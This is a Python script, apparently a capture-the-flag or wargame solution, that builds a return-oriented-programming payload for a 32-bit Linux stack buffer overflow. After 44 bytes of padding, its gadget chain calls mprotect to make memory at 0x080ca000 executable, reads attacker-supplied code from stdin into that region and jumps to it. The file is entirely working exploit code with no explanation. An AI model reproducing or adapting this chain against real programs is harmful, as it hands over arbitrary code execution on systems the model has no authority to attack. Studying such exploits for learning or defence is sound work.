#!/bin/env python

import struct

def p(x):
    return struct.pack('<L', x)

# convert offset to absolute address
def c(x):
    return p(0x08048000 + x)

# empty payload
payload = ""

# padding
payload += "A" * 44

# mprotect(0x080ca000, 128, PROT_READ|PROT_WRITE|PROT_EXEC)
# edx = 7
payload += c(0x0000a476)    # pop edx; ret
payload += p(0xffffffff)    # edx
payload += c(0x00006da1)    # inc edx; add al, 0x83; ret
payload += c(0x00006da1)    # inc edx; add al, 0x83; ret
payload += c(0x00006da1)    # inc edx; add al, 0x83; ret
payload += c(0x00006da1)    # inc edx; add al, 0x83; ret
payload += c(0x00006da1)    # inc edx; add al, 0x83; ret
payload += c(0x00006da1)    # inc edx; add al, 0x83; ret
payload += c(0x00006da1)    # inc edx; add al, 0x83; ret
payload += c(0x00006da1)    # inc edx; add al, 0x83; ret

# ebx = 0x080ca000, ecx = 128
payload += c(0x0000a49d)    # pop ecx; pop ebx; ret
payload += p(0xffffffff)    # ecx
payload += p(0x080ca001)    # ebx = addr + 1
payload += c(0x00007871)    # dec ebx; ret
payload += c(0x000806db)    # inc ecx; ret
payload += c(0x000806db)    # inc ecx; ret
payload += c(0x000806db)    # inc ecx; ret
payload += c(0x0004fd5a)    # add ecx, ecx; ret
payload += c(0x0004fd5a)    # add ecx, ecx; ret
payload += c(0x0004fd5a)    # add ecx, ecx; ret
payload += c(0x0004fd5a)    # add ecx, ecx; ret
payload += c(0x0004fd5a)    # add ecx, ecx; ret
payload += c(0x0004fd5a)    # add ecx, ecx; ret

payload += c(0x000601d6)    # pop eax; ret
payload += p(0xffffffff)    # eax
payload += c(0x0002321e)    # add eax, ecx; ret
payload += c(0x000600c6)    # dec eax; ret
payload += c(0x000600c6)    # dec eax; ret

payload += c(0x0000aba0)    # int 0x80; ret

# read(0, 0x0804ca000, large value)
# eax = 3
payload += c(0x000601d6)    # pop eax; ret
payload += p(0xffffffff)    # eax
payload += c(0x000222ef)    # inc eax; ret
payload += c(0x000222ef)    # inc eax; ret
payload += c(0x000222ef)    # inc eax; ret
payload += c(0x000222ef)    # inc eax; ret

# ebx = 0, ecx = 0x080ca000
payload += c(0x0000a49d)    # pop ecx; pop ebx; ret
payload += p(0x080ca001)    # ecx = addr + 1
payload += p(0xffffffff)    # ebx
payload += c(0x000008e9)    # dec ecx; ret
payload += c(0x000806d1)    # inc ebx; ret

# edx = any large value
payload += c(0x0000a476)    # pop edx; ret
payload += p(0x01111111)    # edx

payload += c(0x0000aba0)    # int 0x80; ret

# jmp to ecx = 0x080ca000
payload += c(0x0005e42c)    # jmp ecx

print payload
